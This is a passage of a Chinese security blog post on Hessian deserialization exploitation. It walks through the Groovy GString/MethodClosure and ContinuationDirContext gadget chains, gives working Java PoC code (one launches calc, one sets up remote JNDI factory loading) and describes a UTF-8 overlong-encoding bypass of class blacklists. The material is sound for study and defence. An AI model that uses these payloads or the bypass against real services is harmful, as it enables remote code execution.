+<h3 id="GString链"><a href="#GString链" class="headerlink" title="GString链"></a>GString链</h3><h4 id="hessian利用"><a href="#hessian利用" class="headerlink" title="hessian利用"></a>hessian利用</h4><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90904" >https://xz.aliyun.com/news/90904<i class="fas fa-external-link-alt"></i></a></p>
+<p>比较新的链子，最后通过Runtime执行。</p>
+<p>调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.Runtime.exec(Runtime.java:<span class="number">347</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.ProcessGroovyMethods.execute(ProcessGroovyMethods.java:<span class="number">530</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.dgm$<span class="number">894.</span>doMethodInvoke(Unknown Source:-<span class="number">1</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">1207</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">1074</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">1016</span>)</span><br><span class="line">at groovy.lang.Closure.call(Closure.java:<span class="number">423</span>)</span><br><span class="line">at groovy.lang.Closure.call(Closure.java:<span class="number">417</span>)</span><br><span class="line">at groovy.lang.GString.writeTo(GString.java:<span class="number">173</span>)</span><br><span class="line">at groovy.lang.GString.toString(GString.java:<span class="number">153</span>)</span><br><span class="line">at groovy.lang.GString.hashCode(GString.java:<span class="number">218</span>)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:<span class="number">338</span>)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:<span class="number">611</span>)</span><br><span class="line">at com.test.gadget.GroovyBased.gString(GroovyBased.java:<span class="number">28</span>)</span><br><span class="line">at com.test.gadget.GroovyBased.main(GroovyBased.java:<span class="number">13</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772505748957-d9dd0922-3d47-45d5-925b-422ca802fd68.png"  alt="img"></p>
+<p>如上图，最后要进入c.call调用方法，所以前面要满足：getStrings有返回；values里面要是Closure及其子类；maximumNumberOfParameters的值是0</p>
+<p>call最终调用到：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772505981455-4840b21a-f059-40b2-b521-5a6973ecdfbd.png"  alt="img"></p>
+<p>因此找一个Closure的子类，且实现doCall，且方法和参数可控的类就行。</p>
+<p>这里用MethodClosure：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772506034180-bbe828d6-3779-4a64-9c1a-9d47780bf519.png"  alt="img"></p>
+<p>由于<code>Groovy</code>为字符串提供了命令执行的特性，提供了一个<code>execute()</code>函数，可以直接对字符串进行命令执行，类似于<code>&quot;whoami&quot;.execute()</code>。</p>
+<p>另外，值得一提的是，通过groovy.lang.GString#writeTo去调用call，是没办法传参的，因为args默认为空Object[0]：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772516715937-87cce095-2480-4612-b922-08a6bc289503.png"  alt="img"></p>
+<p>有没有能够传参的call调用呢？有的，下面的ContinuationDirContext链会讲。</p>
+<p>最终POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">gString</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">    <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">    ReflectTools.setFieldValue(methodClosure, <span class="string">&quot;maximumNumberOfParameters&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    String[] strings = &#123;<span class="string">&quot;any&quot;</span>&#125;;</span><br><span class="line">    Object[] values = &#123;methodClosure&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">GStringImpl</span> <span class="variable">gString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GStringImpl</span>(values, strings);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(gString, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为涉及到groovy相关的知识，暂时看不懂很正常，先明白怎么利用就好。</p>
+<p>当然，这里也可以调用其他方法，只要更改MethodClosure的构造方法即可。owner参数为对象，method参数为对象中的方法。由此可以触发二次反序列化，比如SignedObject#getObject，hutool.MapProxy#getBounds。还有其他的无参方法，比如JdbcRowSetImpl#getDatabaseMetaData触发JNDI。</p>
+<p>java-chains可生成。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772507564864-57481594-58c7-4908-a035-7b3c5305e3ec.png"  alt="img"></p>
+<h4 id="原生反序列化利用"><a href="#原生反序列化利用" class="headerlink" title="原生反序列化利用"></a>原生反序列化利用</h4><p>从调用栈可知，只要触发GString#hashCode，GString#toString，Closure#call其中一个即可。</p>
+<p>下面给出另外三种原生反序列化链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;javax.management.BadAttributeValueExpException: <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream)</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.GString: java.lang.String <span class="title function_">toString</span><span class="params">()</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.GString: java.io.Writer <span class="title function_">writeTo</span><span class="params">(java.io.Writer)</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.Closure: java.lang.Object <span class="title function_">call</span><span class="params">(java.lang.Object)</span>&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面这个适用于常规的反序列化入口被禁用的情况：</p>
+<p>不过我对这条链子有些怀疑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;javax.swing.JCheckBox: <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream)</span>&gt;</span><br><span class="line"> -&gt; &lt;javax.swing.JCheckBox: <span class="keyword">void</span> <span class="title function_">updateUI</span><span class="params">()</span>&gt;</span><br><span class="line"> -&gt; &lt;javax.swing.AbstractButton: <span class="keyword">void</span> <span class="title function_">setUI</span><span class="params">(javax.swing.plaf.ButtonUI)</span>&gt;</span><br><span class="line"> -&gt; &lt;javax.swing.JComponent: <span class="keyword">void</span> <span class="title function_">setUI</span><span class="params">(javax.swing.plaf.ComponentUI)</span>&gt;</span><br><span class="line"> -&gt; &lt;javax.swing.JComponent: <span class="keyword">void</span> <span class="title function_">uninstallUIAndProperties</span><span class="params">()</span>&gt;</span><br><span class="line"> -&gt; &lt;javax.swing.JComponent: <span class="keyword">void</span> <span class="title function_">putClientProperty</span><span class="params">(java.lang.Object,java.lang.Object)</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.GString: java.lang.String <span class="title function_">toString</span><span class="params">()</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.GString: java.io.Writer <span class="title function_">writeTo</span><span class="params">(java.io.Writer)</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.Closure: java.lang.Object <span class="title function_">call</span><span class="params">()</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772506591128-6c1172f0-367c-4dfe-bde6-ad3b865e4e0b.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772506604926-90c04534-7931-43cc-a36f-a23942a82b09.png"  alt="img"></p>
+<p>这里只允许UIClientPropertyKey的子类触发toString，但是GString不是其子类，应该没法进入这个if才对。</p>
+<p>下面这个适用于GString被禁用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;javax.management.BadAttributeValueExpException: <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream)</span>&gt;</span><br><span class="line"> -&gt; &lt;com.sun.org.apache.xerces.internal.impl.xpath.regex.Token: java.lang.String <span class="title function_">toString</span><span class="params">()</span>&gt;</span><br><span class="line"> -&gt; &lt;com.sun.org.apache.xerces.internal.impl.xpath.regex.Token$UnionToken: java.lang.String <span class="title function_">toString</span><span class="params">(<span class="type">int</span>)</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.ListWithDefault: java.lang.Object <span class="title function_">get</span><span class="params">(<span class="type">int</span>)</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.util.ObservableList: java.lang.Object <span class="title function_">set</span><span class="params">(<span class="type">int</span>,java.lang.Object)</span>&gt;</span><br><span class="line"> -&gt; &lt;groovy.lang.Closure: java.lang.Object <span class="title function_">call</span><span class="params">(java.lang.Object)</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ContinuationDirContext链"><a href="#ContinuationDirContext链" class="headerlink" title="ContinuationDirContext链"></a>ContinuationDirContext链</h3><p><a class="link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/2251706.html" >https://cn-sec.com/archives/2251706.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/GroovyBased.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/GroovyBased.java<i class="fas fa-external-link-alt"></i></a>  groovyRef链，适用于 &lt;8u121</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">groovyRef</span><span class="params">(String factory, String factoryLocation)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>, factory, factoryLocation);</span><br><span class="line"></span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line">        cpe.setResolvedObj(reference);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c1</span> <span class="operator">=</span> declaredConstructor.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(c1,<span class="string">&quot;listBindings&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ConvertedClosure</span> <span class="variable">convertedClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;compareTo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparable.class&#125;, convertedClosure);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; e = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor1 = e.getDeclaredConstructor(Object.class, Object.class, e);</span><br><span class="line">        declaredConstructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 根键值对，这里的键会作为最终调用的方法的参数</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> declaredConstructor1.newInstance(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor2 = e.getDeclaredConstructor(Object.class, Object.class, e);</span><br><span class="line">        declaredConstructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 作为根节点的右子树，键为动态代理</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor2.newInstance(o, <span class="number">2</span>, a);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; t = Class.forName(<span class="string">&quot;java.util.TreeMap&quot;</span>);</span><br><span class="line">        <span class="type">TreeMap</span> <span class="variable">treeMap</span> <span class="operator">=</span> (TreeMap) t.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(treeMap, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">modCount</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;modCount&quot;</span>);</span><br><span class="line">        modCount.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modCount.set(treeMap, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">root</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        root.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        root.set(treeMap, a);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置根节点的右子树</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">right</span> <span class="operator">=</span> e.getDeclaredField(<span class="string">&quot;right&quot;</span>);</span><br><span class="line">        right.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        right.set(a, o1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> treeMap;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:<span class="number">296</span>)</span><br><span class="line">at javax.naming.spi.NamingManager.getContext(NamingManager.java:<span class="number">439</span>)</span><br><span class="line">at javax.naming.spi.ContinuationContext.getTargetContext(ContinuationContext.java:<span class="number">55</span>)</span><br><span class="line">at javax.naming.spi.ContinuationContext.listBindings(ContinuationContext.java:<span class="number">130</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">497</span>)</span><br><span class="line">at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class="number">90</span>)</span><br><span class="line">at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class="number">324</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">1207</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">1074</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">1016</span>)</span><br><span class="line">at groovy.lang.Closure.call(Closure.java:<span class="number">423</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.ConvertedClosure.invokeCustom(ConvertedClosure.java:<span class="number">51</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.ConversionHandler.invoke(ConversionHandler.java:<span class="number">103</span>)</span><br><span class="line">at com.sun.proxy.$Proxy0.compareTo(Unknown Source:-<span class="number">1</span>)</span><br><span class="line">at java.util.TreeMap.put(TreeMap.java:<span class="number">568</span>)</span><br><span class="line">at com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:<span class="number">114</span>)</span><br><span class="line">at com.caucho.hessian.io.SerializerFactory.readMap(SerializerFactory.java:<span class="number">571</span>)</span><br><span class="line">at com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:<span class="number">2100</span>)</span><br><span class="line">at tools.HessianTools.hessianDeser(HessianTools.java:<span class="number">69</span>)</span><br><span class="line">at com.test.gadget.GroovyBased.main(GroovyBased.java:<span class="number">31</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里重点关注org.codehaus.groovy.runtime.ConvertedClosure：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772519327958-2b9afa2a-a202-4de9-ac01-cd36a0b059de.png"  alt="img"></p>
+<p>能够看到，51行处调用了call，getDelegate返回值可控，那么就和上面的groovy链一样了，且这里会传参args。那怎么调用到invokeCustom呢？去分析一下这个类。</p>
+<p>其继承自ConversionHandler，最终实现了InvocationHandler，所以它是一个动态代理handler。如果将其作为handler放入动态代理，当调用任何方法时，就会触发其父类，也就是ConversionHandler的invoke方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772519537235-9930d461-f327-418a-8d49-18bd04fcae62.png"  alt="img"></p>
+<p>只要调用的方法不是Object.java里的方法，就会调用invokeCustom。现在的问题在于，到哪里去调用这个动态代理的任意方法，并和Hessian反序列化串联起来。</p>
+<p>这里的方法是，TreeMap#put调用compare。这里设置root节点为 “a”:1，设置其右孩子为 proxy:2，最后就会调用proxy.compareTo(“a”)，从而触发invoke。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772519867048-cd7b7aed-ca21-43ae-980c-b9493ee984d1.png"  alt="img"></p>
+<h1 id="UTF8-OverlongEncoding绕过"><a href="#UTF8-OverlongEncoding绕过" class="headerlink" title="UTF8-OverlongEncoding绕过"></a>UTF8-OverlongEncoding绕过</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html" >https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://exp10it.io/posts/hessian-utf-8-overlong-encoding/" >https://exp10it.io/posts/hessian-utf-8-overlong-encoding/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/X1r0z/hessian-overlong-encoding" >https://github.com/X1r0z/hessian-overlong-encoding<i class="fas fa-external-link-alt"></i></a></p>
+<p>这个方法适用于绕过基于字符串匹配的黑名单，即通过分析序列化数据中的类名，来进行过滤。</p>
+<p>简单说一下原理。</p>
+<p>UTF8能够表示所有unicode字符，通过将unicode编码转化成1~4字节的字符来编码。ASCII码里的字符，原本都可以用一个字节进行表示，但可以通过补零的方式，让其转化成用两个字节表示的非法UTF8字符，且这种非法的字符，在Java里是能够被正常识别的，从而实现绕过。</p>
+<p>效果如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772523776001-6cbede89-8be5-4874-b4b5-b017a42c7a12.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772523788248-d50a0762-3b2f-4745-ac4d-c78e5094a21c.png"  alt="img"></p>
+<p>可以看到编码后可读的类名就消失了。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/CustomObjectOutputStream.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/CustomObjectOutputStream.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以直接替换成这个OutputStream来实现绕过。</p>
+<p>java-chains里也提供了相关选项：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772523897974-02cd800a-09be-4503-96b3-95a2f3b52810.png"  alt="img"></p>
+<h1 id="hessian相关的其他内容"><a href="#hessian相关的其他内容" class="headerlink" title="hessian相关的其他内容"></a>hessian相关的其他内容</h1><p>由于篇幅原因，本文主要介绍hessian利用链相关的知识，但除此之外还有一些其他内容值得学习。</p>
+<h2 id="kryo反序列化"><a href="#kryo反序列化" class="headerlink" title="kryo反序列化"></a>kryo反序列化</h2><p>这个反序列化底层就是hessian，曾经在一些CTF题目中出现。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/CTFJavaChallenge/tree/main/2023/CISCN/seacloud" >https://github.com/1diot9/CTFJavaChallenge/tree/main/2023/CISCN/seacloud<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/CTFJavaChallenge/tree/main/2022/MRCTF/springcoffee" >https://github.com/1diot9/CTFJavaChallenge/tree/main/2022/MRCTF/springcoffee<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="dubbo"><a href="#dubbo" class="headerlink" title="dubbo"></a>dubbo</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14004" >https://xz.aliyun.com/news/14004<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/1193" >https://goodapple.top/archives/1193<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="nacos"><a href="#nacos" class="headerlink" title="nacos"></a>nacos</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13761" >https://xz.aliyun.com/news/13761<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/h0ny/NacosExploit" >https://github.com/h0ny/NacosExploit<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="HessianServlet中的反序列化"><a href="#HessianServlet中的反序列化" class="headerlink" title="HessianServlet中的反序列化"></a>HessianServlet中的反序列化</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17811" >https://xz.aliyun.com/news/17811<i class="fas fa-external-link-alt"></i></a></p>
+<p>后面有时间可能会写文章补充这些内容。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这里主要梳理了一下Hessian序列化与反序列化的流程；介绍了一下CTF中通过黑名单临时修复的方法；以及常见的一些利用链和绕过手法；最后提及了一些暂时没有整理，但是值得一看的其他Hessian知识点。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13039" >超详细解析Hessian利用链-先知社区<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18935" >从2025blackhat-jdd hessian反序列化jdk原生新链开始学习链子构造-先知社区<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90904" >Hessian Groovy全新链条分析与黑名单绕过-先知社区<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/2251706.html" >hessian反序列化漏洞之Groovy链(代码分析) | CN-SEC 中文网<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html" >UTF-8 Overlong Encoding导致的安全问题 | 离别歌<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://exp10it.io/posts/hessian-utf-8-overlong-encoding/" >Hessian UTF-8 Overlong Encoding | X1r0z Blog<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://su18.org/post/hessian/#groovy" >Hessian 反序列化知一二 | 素十八<i class="fas fa-external-link-alt"></i></a> </p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Hessian反序列化整理
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/03/06/Hessian反序列化整理/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-03-06 21:54</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/06/AliyunCTF26-MHGA/"
+                                   title="AliyunCTF26-MHGA"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">AliyunCTF26-MHGA</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
